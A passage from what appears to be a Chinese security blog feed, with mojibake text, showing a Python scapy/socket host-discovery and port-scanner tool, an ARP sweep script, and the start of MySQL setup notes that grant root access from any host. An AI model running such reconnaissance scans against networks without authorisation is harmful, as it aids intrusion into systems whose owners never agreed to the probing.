class="string">&#x27;[*]:å·²å°†æ‚¨è¾“å…¥çš„IPè§£æå®Œæ¯•ã€‚æ­£åœ¨å¯åŠ¨ä¸»æœºå­˜æ´»æ¢æµ‹ï¼Œè¯·ç¨åã€‚ã€‚ã€‚&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æç«¯å£</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_port</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># å¦‚æœä¸æŒ‡å®šç«¯å£åˆ™é»˜è®¤ç«¯å£ï¼Œå¦åˆ™å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè½¬åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> inp_port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port_scan = self.default_port</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># ä»¥é€—å·åˆ†å‰²è¾“å…¥çš„ç«¯å£å­—ç¬¦ä¸²</span></span><br><span class="line">            f_port = self.inp_port.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="comment"># å¾ªç¯åˆ†å‰²åçš„å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨  &#x27;-&#x27; å·(ä¸ºäº†å¯ä»¥å®ç°  -p 81,82,8080-8090çš„æ–¹å¼)</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f_port:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    s_port = i.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                    <span class="keyword">for</span> port <span class="keyword">in</span> range(int(s_port[<span class="number">0</span>]),int(s_port[:<span class="number">-1</span>])+<span class="number">1</span>):</span><br><span class="line">                        self.port_scan.append(port)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.port_scan.append(int(i))</span><br><span class="line">            print(Fore.YELLOW + <span class="string">&#x27;ç«¯å£å¤„ç†å®Œæ¯•ï¼Œå·²æŒ‡æ´¾æ‚¨æŒ‡å®šçš„ç«¯å£ã€‚&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ¤æ–­ä¸»æœºæ˜¯å¦å­˜æ´»</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_host</span>(<span class="params">self, cip</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># # åˆ©ç”¨ARPè¿›è¡Œæ‰«æï¼Œé»˜è®¤å°†æ‰«æç»“æœåŠ å…¥åˆ°å­˜æ´»ä¸»æœºåˆ—è¡¨ä¸­  self.alive_ip</span></span><br><span class="line">            <span class="comment"># a,b = arping(cip)</span></span><br><span class="line">            <span class="comment"># if a.res:</span></span><br><span class="line">            <span class="comment">#     print(&#x27;++++++++YES++++++++&#x27;)</span></span><br><span class="line">            <span class="comment">#     self.alive_ip.append(cip)</span></span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(&#x27;ä¸»æœºä¸å­˜æ´»&#x27;)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ©ç”¨ICMPå‘åŒ…è¿›è¡Œå­˜æ´»ä¸»æœºæ¢æµ‹ï¼Œé»˜è®¤åªå‘ä¸€ä¸ªåŒ…(å¯è®¾ç½®retryå‚æ•°æŒ‡å®šæ¬¡æ•°ï¼Œä½†æ˜¯å—timeoutå‚æ•°å½±å“ï¼Œåœ¨ä¸è¶…æ—¶æ—¶é—´å†…é‡è¯•),  timeoutå½±å“å‡†ç¡®æ€§ï¼Œå»ºè®®ä¸ºå¤§äº1</span></span><br><span class="line">            a = sr1(IP(dst=cip)/ICMP()/<span class="string">&quot;ceshi&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># ä¿®æ”¹äº†sendrecv.py çš„ SndRcvHandlerç±»   verboseå‚æ•°(æ–‡ä»¶çš„88è¡Œ)ï¼Œä¿®æ”¹ä¸º0(é0æ—¶è¾“å‡ºå‘åŒ…è¿‡ç¨‹ã€‚è¿™é‡Œä¸ºäº†è‡ªå®šä¹‰è¾“å‡ºè¿‡ç¨‹ï¼Œç¾åŒ–ç¨‹åºã€‚ã€‚ã€‚ã€‚ã€‚)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># åˆ¤æ–­å“åº”åŒ…ä¸­ICMPæ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºä¸å­˜æ´»ï¼Œä¸ä¸ºç©ºè¾“å‡º è¯¥IPå­˜æ´»ï¼Œå¹¶å°†è¯¥IPåŠ å…¥åˆ°å­˜æ´»ä¸»æœºåˆ—è¡¨</span></span><br><span class="line">            <span class="keyword">if</span> a.getlayer(ICMP):</span><br><span class="line">                <span class="comment"># è¾“å‡ºå­˜æ´»ä¿¡æ¯ å‚è€ƒå®˜ç½‘æ–‡æ¡£</span></span><br><span class="line">                print(Fore.GREEN + a.sprintf(<span class="string">&quot;[*] %IP.src% is alive&quot;</span>))</span><br><span class="line">                self.alive_ip.append(cip)</span><br><span class="line">                <span class="keyword">return</span> a.sprintf(<span class="string">&quot;[*] %IP.src% is alive&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># è®¾ç½®å±è”½é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># print(e)</span></span><br><span class="line">            <span class="comment"># print(&#x27;ä¸»æœºä¸å­˜æ´»&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # åˆ¤æ–­ä¸»æœºå­˜æ´»çš„çº¿ç¨‹æ± </span></span><br><span class="line">    <span class="comment"># def thread_check_alive(self):</span></span><br><span class="line">    <span class="comment">#     pool = ThreadPoolExecutor(self.ta)</span></span><br><span class="line">    <span class="comment">#     for ip in self.ips:</span></span><br><span class="line">    <span class="comment">#         pool.submit(self.check_host, ip)</span></span><br><span class="line">    <span class="comment">#     pool.shutdown()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # scapyæ¨¡å— sr()å‡½æ•° TCPç«¯å£æ‰«æ(ç»è¿‡æµ‹è¯•ï¼Œåœ¨ä¸å¼€å¯å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼Œæ‰«æå‡†ç¡®æ€§ä¸timeout æœ‰å…³ï¼Œä¸€èˆ¬è®¾ç½®2s; å¦‚æœå¼€å¯å¤šçº¿ç¨‹ï¼Œåˆ™æ‰«æç»“æœéå¸¸ä¸ç²¾ç¡®ã€‚[æœªåŠ é”æƒ…å†µä¸‹])</span></span><br><span class="line">    <span class="comment"># def check_port(self,cip):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         res,unans = sr(IP(dst=cip)/TCP(flags=&quot;S&quot;, dport=(self.default_port)),timeout=2)</span></span><br><span class="line">    <span class="comment">#         # ä¿®æ”¹äº†sendrecv.py çš„ SndRcvHandlerç±»   verboseå‚æ•°(æ–‡ä»¶çš„88è¡Œ)ï¼Œä¿®æ”¹ä¸º0(é0æ—¶è¾“å‡ºå‘åŒ…è¿‡ç¨‹ã€‚è¿™é‡Œä¸ºäº†è‡ªå®šä¹‰è¾“å‡ºè¿‡ç¨‹ï¼Œç¾åŒ–ç¨‹åºã€‚ã€‚ã€‚ã€‚ã€‚)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#         if res.res:</span></span><br><span class="line">    <span class="comment">#             port_reslut = []</span></span><br><span class="line">    <span class="comment">#             # å¾ªç¯æ¥å—çš„æ•°æ®åŒ…ï¼Œè¯»å–å…¶ä¸­å¤´éƒ¨flagsä¿¡æ¯ï¼Œå¦‚æœä¸ºSAåˆ™ç«¯å£å­˜æ´»ã€‚</span></span><br><span class="line">    <span class="comment">#             for i in range(len(res.res)):</span></span><br><span class="line">    <span class="comment">#                 flags = res.res[i][1].getlayer(TCP).fields</span></span><br><span class="line">    <span class="comment">#                 if flags[&#x27;flags&#x27;] == &#x27;SA&#x27;:</span></span><br><span class="line">    <span class="comment">#                     port_reslut.append(flags[&#x27;sport&#x27;])</span></span><br><span class="line">    <span class="comment">#                     # RA ä»£è¡¨ä¸å­˜æ´» SA   å­˜æ´»</span></span><br><span class="line">    <span class="comment">#             # ç»è¿‡ä¸Šè¿°å¾ªç¯åˆ¤æ–­ï¼Œå¾—åˆ°çš„å­˜æ´»ç«¯å£å·åˆ—è¡¨ ä¸ä¸»æœºIPå½¢æˆæ–°çš„åˆ—è¡¨ï¼Œå­˜æ”¾åœ¨æœ€ç»ˆçš„æ‰«æç»“æœä¸­ã€‚ å¦‚æœç«¯å£æ‰«æç»“æœä¸ºç©ºï¼Œåˆ™ä¸è®¡å…¥æœ€ç»ˆç»“æœ</span></span><br><span class="line">    <span class="comment">#             if port_reslut:</span></span><br><span class="line">    <span class="comment">#                 cip_result = [cip,port_reslut]</span></span><br><span class="line">    <span class="comment">#                 self.result_port_scan.append(cip_result)</span></span><br><span class="line">    <span class="comment">#             else:pass</span></span><br><span class="line">    <span class="comment">#     except Exception as e:</span></span><br><span class="line">    <span class="comment">#         print(e)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># socketè¿æ¥ï¼Œä¸è¿”å›bannerä¿¡æ¯</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">socket_port_scan</span>(<span class="params">self,cip</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            port_reslut = []</span><br><span class="line">            <span class="comment"># å¾ªç¯ç«¯å£è¿›è¡Œæ‰«æ</span></span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> self.port_scan:</span><br><span class="line">                s = socket.socket()</span><br><span class="line">                s.settimeout(<span class="number">0.5</span>)</span><br><span class="line">                <span class="comment"># print(&#x27;[*]:&#x27;+cip+ &#x27;:&#x27; +str(port))</span></span><br><span class="line">                <span class="keyword">if</span> s.connect_ex((cip, port)) == <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># print(&#x27;[+] : &#x27; + str(port))</span></span><br><span class="line">                    port_reslut.append(port) </span><br><span class="line">                    s.close()  </span><br><span class="line">            <span class="comment"># ç»è¿‡ä¸Šè¿°å¾ªç¯åˆ¤æ–­ï¼Œå¾—åˆ°çš„å­˜æ´»ç«¯å£å·åˆ—è¡¨ ä¸ä¸»æœºIPå½¢æˆæ–°çš„åˆ—è¡¨ï¼Œå­˜æ”¾åœ¨æœ€ç»ˆçš„æ‰«æç»“æœä¸­ã€‚ å¦‚æœç«¯å£æ‰«æç»“æœä¸ºç©ºï¼Œåˆ™ä¸è®¡å…¥æœ€ç»ˆç»“æœ</span></span><br><span class="line">            <span class="keyword">if</span> port_reslut:</span><br><span class="line">                cip_result = [cip,port_reslut]</span><br><span class="line">                self.result_port_scan.append(cip_result)</span><br><span class="line">                print(Fore.GREEN + <span class="string">&#x27;[*]:&#123;0&#125; å¼€æ”¾ç«¯å£æ‰«æå®Œæ¯•&#x27;</span>.format(cip))</span><br><span class="line">                <span class="keyword">return</span> &#123;cip:port_reslut&#125;</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># å±è”½é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># #socketç«¯å£æ‰«æï¼Œè¿”å›bannerä¿¡æ¯ï¼Œ </span></span><br><span class="line">    <span class="comment"># # ä½†æ˜¯ç”±äºæµ‹è¯•ä¸­æ”¶åˆ°çš„ä¿¡æ¯æ— æ³•è§£ç ï¼Œå› æ­¤ä¸è°ƒç”¨è¯¥æ¨¡å—ï¼Œå…ˆæ”¾åœ¨è¿™é‡Œï¼Œä¸ä½œå¤„ç†(ä»¥å‰æ—¶å¯ä»¥çš„ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œä¸è¡Œ)</span></span><br><span class="line">    <span class="comment"># def socket_port_banner(self,cip):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         for port in self.default_port:</span></span><br><span class="line">    <span class="comment">#             s = socket.socket()</span></span><br><span class="line">    <span class="comment">#             s.settimeout(0.1)</span></span><br><span class="line">    <span class="comment">#             s.connect((host, port))</span></span><br><span class="line">    <span class="comment">#             s.sendall(bytes(r&#x27;aaa\r\n\r\n&#x27;, encoding=&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#             banner = s.recv(1024)</span></span><br><span class="line">    <span class="comment">#             if banner:</span></span><br><span class="line">    <span class="comment">#                 print(Fore.GREEN + &#x27;[+] : &#x27; + str(port) + &#x27;\t&#x27; + banner.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#             else:</span></span><br><span class="line">    <span class="comment">#                 print(Fore.GREEN + &#x27;[+] : &#x27; + str(port) + &#x27;\t&#x27; + &#x27;Unknow&#x27;)</span></span><br><span class="line">    <span class="comment">#             s.close()</span></span><br><span class="line">    <span class="comment">#     except:</span></span><br><span class="line">    <span class="comment">#         pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># # å¯¹äºå­˜æ´»çš„ä¸»æœºè¿›è¡Œç«¯å£æ‰«æçš„çº¿ç¨‹æ± </span></span><br><span class="line">    <span class="comment"># def thread_port_scan(self):</span></span><br><span class="line">    <span class="comment">#     p = ThreadPoolExecutor(self.tp)</span></span><br><span class="line">    <span class="comment">#     for ip in self.alive_ip:</span></span><br><span class="line">    <span class="comment">#         p.submit(self.socket_port_scan,ip)</span></span><br><span class="line">    <span class="comment">#     p.shutdown()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">l</span>):</span></span><br><span class="line">    <span class="keyword">if</span> l.result():</span><br><span class="line">        <span class="keyword">with</span> open(os.path.split(os.path.abspath(sys.argv[<span class="number">0</span>]))[<span class="number">0</span>]+<span class="string">&#x27;/surhpscan.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(str(l.result()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># çº¿ç¨‹æ± ï¼Œæ¥å—å‡½æ•°ï¼Œå‡½æ•°å‚æ•°ï¼Œçº¿ç¨‹æ± å¤§å°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_pool</span>(<span class="params">fn,pool,ips</span>):</span></span><br><span class="line">    p = ThreadPoolExecutor(pool)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        p.submit(fn,ip).add_done_callback(log)</span><br><span class="line">    p.shutdown()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    usage = Fore.CYAN + <span class="string">&quot;%prog -i 192.168.10.0/24&quot;</span></span><br><span class="line">    parser = OptionParser(usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--ip&#x27;</span>, dest=<span class="string">&#x27;ip&#x27;</span>, help=<span class="string">&quot;è®¾ç½®æ‰«æçš„IPåœ°å€&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--threads&#x27;</span>, dest=<span class="string">&#x27;threads&#x27;</span>,</span><br><span class="line">                      help=<span class="string">&quot;åŒæ—¶æŒ‡å®š,é»˜è®¤ä¸ºNone.Macå»ºè®®è®¾ç½®20å·¦å³,Winéƒ½å¯ä»¥ã€‚&quot;</span>, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, dest=<span class="string">&#x27;port&#x27;</span>,</span><br><span class="line">                      help=<span class="string">&#x27;è‡ªå®šä¹‰ç«¯å£å·ï¼š80,81,88-90,90&#x27;</span>, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;--ta&#x27;</span>,dest=<span class="string">&#x27;thread_alive&#x27;</span>,help=<span class="string">&#x27;æ¢æµ‹å­˜æ´»ä¸»æœºæ—¶çš„çº¿ç¨‹æ± (é»˜è®¤10)&#x27;</span>,default=<span class="number">10</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;--tp&#x27;</span>, dest=<span class="string">&#x27;thread_port_scan&#x27;</span>, help=<span class="string">&#x27;ç«¯å£æ¢æµ‹æ—¶çº¿ç¨‹æ± (é»˜è®¤5)&#x27;</span>,default=<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># parser.add_option()</span></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.ip:</span><br><span class="line">        <span class="keyword">return</span> options.ip, options.threads, options.port, options.thread_alive, options.thread_port_scan</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(parser.error(Fore.RED + <span class="string">&#x27;å‚æ•°è¾“å…¥æœ‰è¯¯ï¼Œè¯·é‡è¯•ã€‚&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                    .__                                       </span></span><br><span class="line"><span class="string">  ________ _________|  |__ ______  ______ ____ _____    ____  </span></span><br><span class="line"><span class="string"> /  ___/  |  \_  __ \  |  \\\\____ \/  ___// ___\\\__  \  /    \ </span></span><br><span class="line"><span class="string"> \___ \|  |  /|  | \/   Y  \  |_&gt; &gt;___ \\\\  \___ / __ \|   |  \\</span></span><br><span class="line"><span class="string">/____  &gt;____/ |__|  |___|  /   __/____  &gt;\___  &gt;____  /___|  /</span></span><br><span class="line"><span class="string">     \/                  \/|__|       \/     \/     \/     \/ </span></span><br><span class="line"><span class="string">                                               by zhangsan V1.0</span></span><br><span class="line"><span class="string">                                                 2019-12-30</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    start_time = datetime.datetime.now()</span><br><span class="line">    print(Fore.YELLOW + banner)</span><br><span class="line">    <span class="comment"># è·å–å‚æ•°</span></span><br><span class="line">    inp_ip, inp_threads, inp_port, inp_thread_alive, inp_thread_port_scan = main()</span><br><span class="line">    <span class="comment"># å¦‚æœåŒæ—¶æŒ‡å®šçº¿ç¨‹æ± ï¼Œåˆå§‹åŒ–æ—¶å€™ç›´æ¥ä¼ å…¥</span></span><br><span class="line">    <span class="comment"># hosts, threads=None, ta=None, tp=None, inp_port=None</span></span><br><span class="line">    nscan = Nscan(inp_ip,inp_threads,inp_thread_alive,inp_thread_port_scan,inp_port)</span><br><span class="line">    <span class="comment"># nscan.thread_check_alive()</span></span><br><span class="line">    <span class="comment"># nscan.thread_port_scan()</span></span><br><span class="line">    <span class="comment"># print(nscan.alive_ip)</span></span><br><span class="line">    <span class="comment"># print(len(nscan.alive_ip))</span></span><br><span class="line">    <span class="comment"># print(&#x27;+++++++++++++++++++++++&#x27;)</span></span><br><span class="line">    <span class="comment"># print(len(nscan.result_port_scan))</span></span><br><span class="line">    thread_pool(nscan.check_host,nscan.ta,nscan.ips)</span><br><span class="line">    print(Fore.YELLOW + <span class="string">&#x27;[+]:å­˜æ´»ä¸»æœºæ‰«æå®Œæ¯•ã€‚å…±å‘ç°å­˜æ´»ä¸»æœº&#123;0&#125;å°&#x27;</span>.format(len(nscan.alive_ip)))</span><br><span class="line">    print(Fore.CYAN + <span class="string">&#x27;[*]---------Port Scaning--------[*]&#x27;</span>)</span><br><span class="line">    thread_pool(nscan.socket_port_scan,nscan.tp,nscan.alive_ip)</span><br><span class="line">    <span class="comment"># è¾“å‡ºå­˜æ´»ä¸»æœºç«¯å£ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nscan.result_port_scan:</span><br><span class="line">        print(i)</span><br><span class="line">    print(Fore.YELLOW + <span class="string">&#x27;[+]:å­˜æ´»ä¸»æœºçš„ç«¯å£å·²æ‰«æå®Œæ¯•ã€‚æœ‰ç»“æœçš„å…±&#123;0&#125;æ¡ã€‚&#x27;</span>.format(len(nscan.result_port_scan)))</span><br><span class="line">    end_time = datetime.datetime.now()</span><br><span class="line">    print(Fore.CYAN + <span class="string">&#x27;[Time] : ç¨‹åºæ‰§è¡Œæ—¶é—´ &#123;0&#125; ç§’&#x27;</span>.format((end_time - start_time).seconds))</span><br></pre></td></tr></table></figure>

<h2 id="ARPæ‰«æ"><a href="#ARPæ‰«æ" class="headerlink" title="ARPæ‰«æ"></a>ARPæ‰«æ</h2><p>ç®€å•ä½¿ç”¨äº†ARPæ¨¡å—ï¼Œæ²¡åŠæ³•ï¼Œæ¯•ç«Ÿæ˜¯æœ€å¿«çš„ã€‚</p>
<ul>
<li>python3 cscan.py 192.168.90.1</li>
<li>python3 cscan.py 192.168.90.0.24</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># FileName  :  cscan.py</span></span><br><span class="line"><span class="comment"># Time      :  2020/04/10 15:43:08</span></span><br><span class="line"><span class="comment"># Author    :  OuDeNiu</span></span><br><span class="line"><span class="comment"># Email     :  havebutno@gmail.com</span></span><br><span class="line"><span class="comment"># Version   :  1.0</span></span><br><span class="line"><span class="comment"># Descript  :  æµ‹è¯•ARP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, init</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.NOTSET,format = <span class="string">&#x27;%(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªåŠ¨é‡ç½®é¢œè‰²</span></span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_host_arp</span>(<span class="params">cip</span>):</span></span><br><span class="line">    a,b = srp(Ether(dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(pdst=cip),timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># print(a.res)</span></span><br><span class="line">    <span class="comment"># print(a.res)</span></span><br><span class="line">    <span class="comment"># print(a.res[0][1].getlayer(ARP).fields)</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> a.res:</span><br><span class="line">        <span class="comment"># print(ip[1].getlayer(ARP).fields)</span></span><br><span class="line">        <span class="comment"># mac = ip[1].getlayer(ARP).fields[&#x27;hwsrc&#x27;]</span></span><br><span class="line">        <span class="comment"># result_ip = ip[1].getlayer(ARP).fields[&#x27;psrc&#x27;]</span></span><br><span class="line">        result_ip = ip[<span class="number">1</span>].getlayer(ARP).fields[<span class="string">&#x27;psrc&#x27;</span>]</span><br><span class="line">        logging.debug(Fore.GREEN + str(result_ip) + <span class="string">&quot; is alive.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_time = datetime.datetime.now()</span><br><span class="line">    hosts = sys.argv[<span class="number">1</span>]</span><br><span class="line">    logging.debug(Fore.CYAN + <span class="string">&quot;å¼€å§‹æ‰«æ &quot;</span> + hosts)</span><br><span class="line">    check_host_arp(hosts)</span><br><span class="line">    end_time = datetime.datetime.now()</span><br><span class="line">    print(Fore.CYAN + <span class="string">&#x27;[Time] : ç¨‹åºæ‰§è¡Œæ—¶é—´ &#123;0&#125; ç§’&#x27;</span>.format((end_time - start_time).seconds))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŸæœ¬æ˜¯æƒ³åŠ ä¸Šå¼±å£ä»¤æ‰«æçš„ï¼Œå› ä¸ºpython2 çš„socketè¿”å›çš„æ˜¯å­—ç¬¦ä¸²ï¼Œpython3çš„socketæ˜¯å­—èŠ‚ï¼Œéƒ¨åˆ†å­—èŠ‚æ— æ³•è§£ç å°±å‡ºäº†é—®é¢˜ã€‚ã€‚ã€‚æ²¡æœ‰è§£å†³æ‰€ä»¥ã€‚ã€‚ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>tools</tag>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLå°ç»“</title>
    <url>/posts/c118d50/</url>
    <content><![CDATA[<p>Webç¨‹åºä»£ç ä¸­å¯¹äºç”¨æˆ·æäº¤çš„å‚æ•°æœªåšè¿‡æ»¤å°±ç›´æ¥æ”¾åˆ°SQLè¯­å¥ä¸­æ‰§è¡Œ,å¯¼è‡´å‚æ•°ä¸­çš„ç‰¹æ®Šå­—ç¬¦æ‰“ç ´äº†SQLè¯­å¥åŸæœ‰é€»è¾‘,é»‘å®¢å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„SQLè¯­å¥ã€‚</p>
<a id="more"></a>

<h1 id="MySQLå®‰è£…åŠé…ç½®"><a href="#MySQLå®‰è£…åŠé…ç½®" class="headerlink" title="MySQLå®‰è£…åŠé…ç½®"></a>MySQLå®‰è£…åŠé…ç½®</h1><h2 id="Mysqlå®‰è£…ï¼ˆè¿™é‡Œç‰ˆæœ¬ä¸º8-0-17ï¼‰"><a href="#Mysqlå®‰è£…ï¼ˆè¿™é‡Œç‰ˆæœ¬ä¸º8-0-17ï¼‰" class="headerlink" title="Mysqlå®‰è£…ï¼ˆè¿™é‡Œç‰ˆæœ¬ä¸º8.0.17ï¼‰"></a>Mysqlå®‰è£…ï¼ˆè¿™é‡Œç‰ˆæœ¬ä¸º8.0.17ï¼‰</h2><ul>
<li>ç¬¬ä¸€æ­¥ï¼šä¸‹è½½Mysql</li>
</ul>
<blockquote>
<p>åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9kZXYubXlzcWwuY29tL2Rvd25sb2Fkcy9teXNxbC8=">https://dev.mysql.com/downloads/mysql/<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<ul>
<li>ç¬¬äºŒæ­¥ï¼šé…ç½®Mysqlç¯å¢ƒå˜é‡</li>
</ul>
<blockquote>
<p>å°†ä¸‹è½½çš„mysqlæ–‡ä»¶å¤¹<code>bin</code>ç›®å½•åŠ å…¥ç¯å¢ƒå˜é‡ï¼Œ<code>D:\mysql\bin</code></p>
</blockquote>
<ul>
<li>ç¬¬ä¸‰æ­¥ï¼šå®‰è£…mysql</li>
</ul>
<blockquote>
<p>é¦–å…ˆæ‰§è¡Œ<code>mysqld --initialize-insecure</code>(è‡ªåŠ¨ç”Ÿæˆæ— å¯†ç Rootç”¨æˆ·)ï¼Œç„¶åä»¥ç®¡ç†å‘˜çš„æƒé™æ‰§è¡ŒCMDï¼š<code>mysqld install</code>ï¼Œå³å¯å®Œæˆå®‰è£…ã€‚</p>
</blockquote>
<ul>
<li>ç¬¬å››æ­¥ï¼šå¯åŠ¨/åœæ­¢mysql</li>
</ul>
<blockquote>
<p><code>net start mysql</code></p>
<p><code>net stop mysql</code></p>
</blockquote>
<h2 id="ç™»é™†MySQLåŠé…ç½®å¯†ç "><a href="#ç™»é™†MySQLåŠé…ç½®å¯†ç " class="headerlink" title="ç™»é™†MySQLåŠé…ç½®å¯†ç "></a>ç™»é™†MySQLåŠé…ç½®å¯†ç </h2><ul>
<li>ç™»é™†MySQL(è¿™é‡Œåˆ›å»ºçš„æ˜¯æ— å¯†ç root)</li>
</ul>
<blockquote>
<p><code>mysql -u root -p</code>ï¼Œæç¤ºè¾“å…¥å¯†ç æ—¶å€™æ— éœ€è¾“å…¥ï¼Œå›è½¦å³å¯ã€‚</p>
</blockquote>
<ul>
<li>æ›´æ”¹Mysqlå¯†ç </li>
</ul>
<blockquote>
<p><code>ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;RootPwd@123456&#39;;</code></p>
<p><code>flush privileges;</code></p>
</blockquote>
<ul>
<li>å¼€å¯mysqlè¿œç¨‹</li>
</ul>
<p>æŸ¥çœ‹æ˜¯å¦æ”¯æŒè¿œç¨‹ï¼š <code>select host ,user from user;</code></p>
<blockquote>
<p>ç¬¬ä¸€ç§ï¼š<code>update user set host =&#39;%&#39; where user=&#39;root&#39;;</code></p>
<p>ç¬¬äºŒç§ï¼š<code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option; </code></p>
</blockquote>
